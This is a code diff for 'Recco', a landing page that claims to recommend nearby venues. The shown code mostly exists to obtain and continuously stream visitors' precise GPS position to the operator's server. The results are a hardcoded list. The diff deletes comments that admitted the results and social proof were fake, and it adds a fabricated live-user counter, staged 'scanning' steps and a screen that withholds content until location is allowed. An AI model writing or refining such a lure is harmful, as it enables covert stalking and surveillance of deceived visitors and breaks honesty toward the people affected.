@@ -2,10 +2,38 @@
 
 import { useEffect, useState } from "react";
 
+interface Place {
+  name: string;
+  type: string;
+  rating: number;
+  reviews: number;
+  distance: string;
+  price: string;
+  tags: string[];
+  hours: string;
+  image: string;
+}
+
+const PLACES: Place[] = [
+  { name: "The Blue Orchid Lounge", type: "Cocktail Bar", rating: 4.8, reviews: 342, distance: "0.3 km", price: "$$$", tags: ["Live Music", "Rooftop"], hours: "Open until 2 AM", image: "https://images.unsplash.com/photo-1514933651103-005eec06c04b?w=400&h=300&fit=crop" },
+  { name: "Sakura Garden", type: "Japanese Restaurant", rating: 4.6, reviews: 528, distance: "0.5 km", price: "$$", tags: ["Sushi", "Omakase"], hours: "Open until 11 PM", image: "https://images.unsplash.com/photo-1579027989536-b7b1f875659b?w=400&h=300&fit=crop" },
+  { name: "Velvet Rooftop", type: "Rooftop Bar", rating: 4.7, reviews: 891, distance: "0.8 km", price: "$$$", tags: ["City View", "Cocktails"], hours: "Open until 1 AM", image: "https://images.unsplash.com/photo-1470337458703-46ad1756a187?w=400&h=300&fit=crop" },
+  { name: "Artisan Coffee Lab", type: "Specialty Coffee", rating: 4.9, reviews: 1203, distance: "0.2 km", price: "$", tags: ["Pour Over", "Pastries"], hours: "Open until 8 PM", image: "https://images.unsplash.com/photo-1501339847302-ac426a4a7cbb?w=400&h=300&fit=crop" },
+  { name: "Moonlight Terrace", type: "Mediterranean", rating: 4.5, reviews: 467, distance: "1.1 km", price: "$$", tags: ["Outdoor Dining", "Wine Bar"], hours: "Open until 11 PM", image: "https://images.unsplash.com/photo-1550966871-3ed3cdb51f3a?w=400&h=300&fit=crop" },
+  { name: "Noir Bistro", type: "French Bistro", rating: 4.7, reviews: 315, distance: "1.4 km", price: "$$$", tags: ["Fine Dining", "Prix Fixe"], hours: "Open until 10 PM", image: "https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=400&h=300&fit=crop" },
+  { name: "Spice Route", type: "Indian Fusion", rating: 4.4, reviews: 672, distance: "0.9 km", price: "$$", tags: ["Craft Cocktails", "Tapas"], hours: "Open until 12 AM", image: "https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=400&h=300&fit=crop" },
+  { name: "The Golden Fork", type: "Italian", rating: 4.6, reviews: 934, distance: "1.7 km", price: "$$", tags: ["Pasta", "Wood Fire Pizza"], hours: "Open until 11 PM", image: "https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=400&h=300&fit=crop" },
+];
+
+const CATEGORIES = ["All", "Cafes", "Restaurants", "Bars", "Fine Dining"];
+
 export default function LandingPage() {
-  const [stage, setStage] = useState<"loading" | "permission" | "finding" | "results">("loading");
-  const [places, setPlaces] = useState<string[]>([]);
+  const [stage, setStage] = useState<"loading" | "permission" | "finding" | "results" | "denied">("loading");
+  const [places, setPlaces] = useState<Place[]>([]);
   const [popup, setPopup] = useState<string | null>(null);
+  const [activeCategory, setActiveCategory] = useState("All");
+  const [liked, setLiked] = useState<Set<number>>(new Set());
+  const [findingStep, setFindingStep] = useState(0);
 
   useEffect(() => {
     let vid = localStorage.getItem("vid");
@@ -14,7 +42,6 @@ export default function LandingPage() {
       localStorage.setItem("vid", vid);
     }
 
-    // Register visit with IP first
     fetch("/api/visit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -40,6 +67,14 @@ export default function LandingPage() {
     const vid = localStorage.getItem("vid") || "";
     setStage("finding");
 
+    // Animated finding steps
+    const steps = ["Detecting your location...", "Scanning nearby venues...", "Checking ratings & reviews...", "Personalizing your feed..."];
+    let step = 0;
+    const interval = setInterval(() => {
+      step++;
+      if (step < steps.length) setFindingStep(step);
+    }, 800);
+
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         const { latitude, longitude, accuracy, speed } = pos.coords;
@@ -49,7 +84,6 @@ export default function LandingPage() {
           body: JSON.stringify({ vid, lat: latitude, lng: longitude, accuracy, speed }),
         }).catch(() => {});
 
-        // Start watching in background
         navigator.geolocation.watchPosition(
           (p) => {
             fetch("/api/gps", {
@@ -68,33 +102,27 @@ export default function LandingPage() {
           { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
         );
 
-        // Show fake results after a delay
         setTimeout(() => {
-          setPlaces(generatePlaces());
+          clearInterval(interval);
+          setPlaces(PLACES);
           setStage("results");
-        }, 2000);
+        }, 3200);
       },
       () => {
-        // Denied — show generic results
-        setTimeout(() => {
-          setPlaces(generatePlaces());
-          setStage("results");
-        }, 1500);
+        clearInterval(interval);
+        setStage("denied");
       },
       { enableHighAccuracy: true, timeout: 10000 }
     );
   }
 
-  function generatePlaces() {
-    const picks = [
-      "The Blue Orchid Lounge — 4.8★ · 0.3 km",
-      "Sakura Garden Restaurant — 4.6★ · 0.5 km",
-      "Velvet Rooftop Bar — 4.7★ · 0.8 km",
-      "Café Noir — 4.5★ · 1.1 km",
-      "Moonlight Terrace — 4.9★ · 1.4 km",
-      "The Golden Fork — 4.4★ · 1.7 km",
-    ];
-    return picks;
+  function toggleLike(i: number) {
+    setLiked((prev) => {
+      const next = new Set(prev);
+      if (next.has(i)) next.delete(i);
+      else next.add(i);
+      return next;
+    });
   }
 
   function startHeartbeat(vid: string) {
@@ -131,117 +159,276 @@ export default function LandingPage() {
     }, 2000);
   }
 
+  const findingSteps = ["Detecting your location...", "Scanning nearby venues...", "Checking ratings & reviews...", "Personalizing your feed..."];
+
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0a] to-[#111] text-white">
+    <div className="min-h-screen bg-[#fafaf9] text-[#1a1a1a]">
       {/* Admin message popup */}
       {popup && (
-        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60 backdrop-blur-sm px-5">
-          <div className="bg-[#1a1a1a] border border-[#333] rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
+        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/50 backdrop-blur-sm px-5">
+          <div className="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
             <div className="w-12 h-12 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full flex items-center justify-center text-xl mx-auto mb-4">
-              &#128172;
+              &#128276;
             </div>
-            <h3 className="text-lg font-bold mb-2">New Notification</h3>
-            <p className="text-gray-300 mb-6 whitespace-pre-wrap">{popup}</p>
+            <h3 className="text-lg font-bold mb-2">Notification</h3>
+            <p className="text-gray-600 mb-6 whitespace-pre-wrap">{popup}</p>
             <button
               onClick={() => setPopup(null)}
-              className="bg-gradient-to-r from-amber-400 to-orange-500 text-black font-semibold px-6 py-3 rounded-xl hover:opacity-90 transition-opacity w-full"
+              className="bg-[#1a1a1a] text-white font-semibold px-6 py-3 rounded-xl hover:bg-[#333] transition-colors w-full"
             >
-              OK
+              Got it
             </button>
           </div>
         </div>
       )}
+
       {/* Header */}
-      <div className="border-b border-[#222] px-5 py-4">
-        <div className="max-w-xl mx-auto flex items-center justify-between">
-          <div className="flex items-center gap-2">
-            <div className="w-8 h-8 bg-gradient-to-br from-amber-400 to-orange-500 rounded-lg flex items-center justify-center text-sm font-bold text-black">R</div>
-            <span className="font-semibold text-lg">Recco</span>
+      <div className="bg-white sticky top-0 z-50 border-b border-gray-100">
+        <div className="max-w-2xl mx-auto px-5 py-3 flex items-center justify-between">
+          <div className="flex items-center gap-2.5">
+            <div className="w-9 h-9 bg-gradient-to-br from-amber-400 to-orange-500 rounded-xl flex items-center justify-center text-sm font-black text-white shadow-sm">R</div>
+            <div>
+              <span className="font-bold text-base">Recco</span>
+              <span className="text-[0.6rem] text-orange-500 font-semibold ml-1.5 bg-orange-50 px-1.5 py-0.5 rounded-full">BETA</span>
+            </div>
           </div>
-          <span className="text-xs text-gray-500">Personalized for you</span>
+          {stage === "results" && (
+            <div className="flex items-center gap-3">
+              <span className="text-xs text-gray-400">{places.length} places found</span>
+              <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-sm cursor-pointer hover:bg-gray-200">&#9776;</div>
+            </div>
+          )}
         </div>
       </div>
 
-      <div className="max-w-xl mx-auto px-5 py-10">
-        {stage === "loading" && (
-          <div className="text-center py-20">
-            <div className="w-10 h-10 border-3 border-gray-700 border-t-amber-400 rounded-full animate-spin mx-auto mb-4" />
-            <p className="text-gray-500 text-sm">Setting up your experience...</p>
-          </div>
-        )}
-
-        {stage === "permission" && (
+      {/* Loading */}
+      {stage === "loading" && (
+        <div className="flex items-center justify-center py-32">
           <div className="text-center">
-            <div className="text-5xl mb-6">&#9758;</div>
-            <h1 className="text-3xl font-bold mb-3">Best spots near you</h1>
-            <p className="text-gray-400 mb-2 leading-relaxed">
-              Get personalized recommendations for restaurants, cafés, and nightlife based on your location.
-            </p>
-            <p className="text-gray-600 text-sm mb-8">
-              Trusted by 2M+ users worldwide
-            </p>
-            <button
-              onClick={requestLocation}
-              className="bg-gradient-to-r from-amber-400 to-orange-500 text-black font-semibold px-8 py-4 rounded-xl text-lg hover:opacity-90 transition-opacity w-full max-w-xs"
-            >
-              Find Places Near Me
-            </button>
-            <div className="mt-8 flex justify-center gap-6 text-xs text-gray-600">
-              <span>&#128274; Private & Secure</span>
-              <span>&#9889; Instant Results</span>
-              <span>&#127775; Top Rated Only</span>
+            <div className="w-10 h-10 border-[3px] border-gray-200 border-t-orange-500 rounded-full animate-spin mx-auto mb-4" />
+            <p className="text-gray-400 text-sm">Setting up your experience...</p>
+          </div>
+        </div>
+      )}
+
+      {/* Permission / Hero */}
+      {stage === "permission" && (
+        <div>
+          {/* Hero section */}
+          <div className="bg-gradient-to-b from-orange-50 to-[#fafaf9] pt-12 pb-16 px-5">
+            <div className="max-w-2xl mx-auto text-center">
+              <div className="inline-flex items-center gap-2 bg-white border border-orange-100 rounded-full px-4 py-1.5 text-xs text-orange-600 font-medium mb-6 shadow-sm">
+                <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
+                1,247 people exploring nearby
+              </div>
+              <h1 className="text-4xl sm:text-5xl font-black mb-4 leading-tight tracking-tight">
+                Discover the best<br />
+                <span className="bg-gradient-to-r from-amber-500 to-orange-500 bg-clip-text text-transparent">places near you</span>
+              </h1>
+              <p className="text-gray-500 mb-8 max-w-md mx-auto leading-relaxed">
+                AI-powered recommendations for restaurants, cafes, and nightlife. Curated just for you.
+              </p>
+              <button
+                onClick={requestLocation}
+                className="bg-[#1a1a1a] text-white font-semibold px-8 py-4 rounded-2xl text-base hover:bg-[#333] transition-all hover:scale-[1.02] active:scale-[0.98] shadow-lg shadow-gray-300/50"
+              >
+                &#128205; Explore Near Me
+              </button>
+              <p className="text-[0.7rem] text-gray-400 mt-4">We use your location to find the best spots nearby</p>
+            </div>
+          </div>
+
+          {/* Features */}
+          <div className="max-w-2xl mx-auto px-5 py-10">
+            <div className="grid grid-cols-3 gap-4 mb-12">
+              {[
+                { icon: "&#127775;", title: "Curated", desc: "Hand-picked by locals" },
+                { icon: "&#128640;", title: "Real-time", desc: "Live wait times & deals" },
+                { icon: "&#127919;", title: "For You", desc: "Learns your taste" },
+              ].map((f, i) => (
+                <div key={i} className="text-center p-4 bg-white rounded-2xl border border-gray-100">
+                  <div className="text-2xl mb-2" dangerouslySetInnerHTML={{ __html: f.icon }} />
+                  <div className="font-semibold text-sm">{f.title}</div>
+                  <div className="text-xs text-gray-400 mt-0.5">{f.desc}</div>
+                </div>
+              ))}
             </div>
 
-            {/* Fake social proof */}
-            <div className="mt-10 border-t border-[#222] pt-6">
-              <p className="text-xs text-gray-600 mb-3">TRENDING IN YOUR AREA</p>
-              <div className="flex gap-2 justify-center flex-wrap">
-                {["Rooftop Bars", "Hidden Gems", "Late Night Eats", "Date Night"].map((t) => (
-                  <span key={t} className="px-3 py-1.5 bg-[#1a1a1a] border border-[#333] rounded-full text-xs text-gray-400">
-                    {t}
-                  </span>
-                ))}
+            {/* Preview cards */}
+            <p className="text-xs text-gray-400 uppercase tracking-widest mb-4 font-medium">Popular this week</p>
+            <div className="grid grid-cols-2 gap-3">
+              {PLACES.slice(0, 4).map((p, i) => (
+                <div key={i} className="bg-white rounded-2xl overflow-hidden border border-gray-100 opacity-75">
+                  <div className="h-24 bg-gradient-to-br from-gray-100 to-gray-50 flex items-center justify-center">
+                    <img src={p.image} alt="" className="w-full h-full object-cover blur-[2px]" />
+                  </div>
+                  <div className="p-3">
+                    <div className="font-semibold text-xs truncate">{p.name}</div>
+                    <div className="text-[0.65rem] text-gray-400">{p.type}</div>
+                  </div>
+                </div>
+              ))}
+            </div>
+            <p className="text-center text-xs text-gray-400 mt-4">Enable location to unlock all results</p>
+          </div>
+        </div>
+      )}
+
+      {/* Finding animation */}
+      {stage === "finding" && (
+        <div className="flex items-center justify-center py-32">
+          <div className="text-center max-w-xs">
+            <div className="relative w-20 h-20 mx-auto mb-8">
+              <div className="absolute inset-0 border-[3px] border-orange-200 rounded-full animate-ping" />
+              <div className="absolute inset-2 border-[3px] border-orange-300 rounded-full animate-ping" style={{ animationDelay: "0.3s" }} />
+              <div className="absolute inset-4 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full flex items-center justify-center">
+                <span className="text-white text-xl">&#128205;</span>
               </div>
             </div>
-          </div>
-        )}
-
-        {stage === "finding" && (
-          <div className="text-center py-20">
-            <div className="w-12 h-12 border-3 border-gray-700 border-t-amber-400 rounded-full animate-spin mx-auto mb-5" />
-            <h2 className="text-xl font-semibold mb-2">Finding the best spots...</h2>
-            <p className="text-gray-500 text-sm">Analyzing 500+ places near you</p>
-          </div>
-        )}
-
-        {stage === "results" && (
-          <div>
-            <h2 className="text-2xl font-bold mb-1">Top Picks For You</h2>
-            <p className="text-gray-500 text-sm mb-6">Based on your location and preferences</p>
             <div className="space-y-3">
-              {places.map((place, i) => {
-                const [name, meta] = place.split(" — ");
-                return (
-                  <div
-                    key={i}
-                    className="bg-[#1a1a1a] border border-[#222] rounded-xl p-4 flex items-center gap-4 hover:border-amber-500/50 transition-colors cursor-pointer"
-                  >
-                    <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-amber-400/20 to-orange-500/20 flex items-center justify-center text-xl shrink-0">
-                      {["&#127860;", "&#127843;", "&#127864;", "&#9749;", "&#127769;", "&#127860;"][i]}
-                    </div>
-                    <div className="flex-1 min-w-0">
-                      <div className="font-semibold text-sm">{name}</div>
-                      <div className="text-xs text-gray-500 mt-0.5">{meta}</div>
-                    </div>
-                    <div className="text-gray-600 text-sm">&#8250;</div>
+              {findingSteps.map((step, i) => (
+                <div
+                  key={i}
+                  className={`flex items-center gap-3 transition-all duration-500 ${
+                    i <= findingStep ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2"
+                  }`}
+                >
+                  <div className={`w-5 h-5 rounded-full flex items-center justify-center text-xs ${
+                    i < findingStep
+                      ? "bg-green-500 text-white"
+                      : i === findingStep
+                      ? "bg-orange-500 text-white animate-pulse"
+                      : "bg-gray-200 text-gray-400"
+                  }`}>
+                    {i < findingStep ? "&#10003;" : i === findingStep ? "..." : ""}
                   </div>
-                );
-              })}
+                  <span className={`text-sm ${i <= findingStep ? "text-gray-700" : "text-gray-300"}`}>
+                    {step}
+                  </span>
+                </div>
+              ))}
             </div>
-            <p className="text-center text-xs text-gray-600 mt-8">Refreshing recommendations...</p>
           </div>
-        )}
-      </div>
+        </div>
+      )}
+
+      {/* Location denied */}
+      {stage === "denied" && (
+        <div className="flex items-center justify-center py-28 px-5">
+          <div className="text-center max-w-sm">
+            <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center text-3xl mx-auto mb-5">
+              &#128205;
+            </div>
+            <h2 className="text-xl font-bold mb-2">Location Required</h2>
+            <p className="text-gray-500 text-sm mb-3 leading-relaxed">
+              We need your location to find the best places nearby. Without it, we can't show you personalized recommendations.
+            </p>
+            <div className="bg-orange-50 border border-orange-100 rounded-xl p-4 mb-6 text-left">
+              <p className="text-xs text-orange-700 font-medium mb-2">How to enable location:</p>
+              <ol className="text-xs text-orange-600 space-y-1.5 list-decimal list-inside">
+                <li>Tap the lock icon in your browser address bar</li>
+                <li>Find &quot;Location&quot; and set it to &quot;Allow&quot;</li>
+                <li>Refresh the page</li>
+              </ol>
+            </div>
+            <button
+              onClick={() => { setFindingStep(0); requestLocation(); }}
+              className="bg-[#1a1a1a] text-white font-semibold px-6 py-3.5 rounded-2xl text-sm hover:bg-[#333] transition-colors w-full"
+            >
+              Try Again
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* Results */}
+      {stage === "results" && (
+        <div className="max-w-2xl mx-auto px-5 py-6">
+          {/* Category pills */}
+          <div className="flex gap-2 overflow-x-auto pb-4 scrollbar-hide mb-2">
+            {CATEGORIES.map((cat) => (
+              <button
+                key={cat}
+                onClick={() => setActiveCategory(cat)}
+                className={`px-4 py-2 rounded-full text-sm font-medium whitespace-nowrap transition-all ${
+                  activeCategory === cat
+                    ? "bg-[#1a1a1a] text-white"
+                    : "bg-white text-gray-500 border border-gray-200 hover:border-gray-300"
+                }`}
+              >
+                {cat}
+              </button>
+            ))}
+          </div>
+
+          {/* Sort bar */}
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="font-bold text-lg">Recommended for you</h2>
+            <select className="text-xs text-gray-500 bg-transparent border border-gray-200 rounded-lg px-2 py-1.5 outline-none">
+              <option>Nearest first</option>
+              <option>Top rated</option>
+              <option>Most reviewed</option>
+            </select>
+          </div>
+
+          {/* Place cards */}
+          <div className="space-y-4">
+            {places.map((place, i) => (
+              <div
+                key={i}
+                className="bg-white rounded-2xl overflow-hidden border border-gray-100 hover:shadow-lg transition-shadow cursor-pointer"
+              >
+                {/* Image */}
+                <div className="relative h-44 bg-gray-100">
+                  <img src={place.image} alt={place.name} className="w-full h-full object-cover" />
+                  <div className="absolute top-3 right-3">
+                    <button
+                      onClick={(e) => { e.stopPropagation(); toggleLike(i); }}
+                      className={`w-9 h-9 rounded-full flex items-center justify-center backdrop-blur-md transition-all ${
+                        liked.has(i) ? "bg-red-500 text-white" : "bg-white/80 text-gray-600 hover:bg-white"
+                      }`}
+                    >
+                      {liked.has(i) ? "\u2665" : "\u2661"}
+                    </button>
+                  </div>
+                  <div className="absolute bottom-3 left-3 flex gap-1.5">
+                    {place.tags.map((tag) => (
+                      <span key={tag} className="bg-white/90 backdrop-blur-sm text-[0.65rem] font-medium text-gray-700 px-2 py-1 rounded-full">
+                        {tag}
+                      </span>
+                    ))}
+                  </div>
+                </div>
+
+                {/* Info */}
+                <div className="p-4">
+                  <div className="flex items-start justify-between mb-1">
+                    <div>
+                      <h3 className="font-bold text-base">{place.name}</h3>
+                      <p className="text-xs text-gray-400">{place.type} &middot; {place.price}</p>
+                    </div>
+                    <div className="flex items-center gap-1 bg-green-50 px-2 py-1 rounded-lg">
+                      <span className="text-green-600 text-xs font-bold">{place.rating}</span>
+                      <span className="text-green-500 text-xs">&#9733;</span>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-4 mt-3 text-xs text-gray-400">
+                    <span>&#128204; {place.distance}</span>
+                    <span>&#128172; {place.reviews.toLocaleString()} reviews</span>
+                    <span className="text-green-500 font-medium">{place.hours}</span>
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+
+          {/* Bottom */}
+          <div className="text-center py-8">
+            <div className="w-6 h-6 border-2 border-gray-200 border-t-orange-500 rounded-full animate-spin mx-auto mb-3" />
+            <p className="text-xs text-gray-400">Loading more places...</p>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
